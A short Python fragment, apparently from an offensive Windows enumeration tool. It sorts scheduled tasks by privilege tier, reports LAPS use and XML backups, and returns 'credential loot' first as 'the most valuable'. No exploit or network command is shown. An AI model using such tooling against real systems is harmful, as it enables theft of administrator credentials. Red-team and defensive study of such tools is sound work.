    # Sort tasks by priority: TIER-0 > PRIV > TASK
    sorted_lines = _sort_tasks_by_priority(lines)
    backup_msg = f", {total} raw XMLs backed up" if backup_target_dir else ""
    laps_msg = f" (LAPS: {laps_type_used})" if laps_used else ""

    priv_display = priv_count if (hv and hv.loaded) else 'N/A'
    status(f"[Collecting] {target} [+]")
    status(f"[TaskCount] {total} Tasks, {priv_display} Privileged")
    good(f"{target}: Found {total} tasks, privileged {priv_display}{backup_msg}{laps_msg}")

    # Combine credential loot output with task listing output
    # Put credentials first since they're the most valuable
    return out_lines + sorted_lines, laps_result
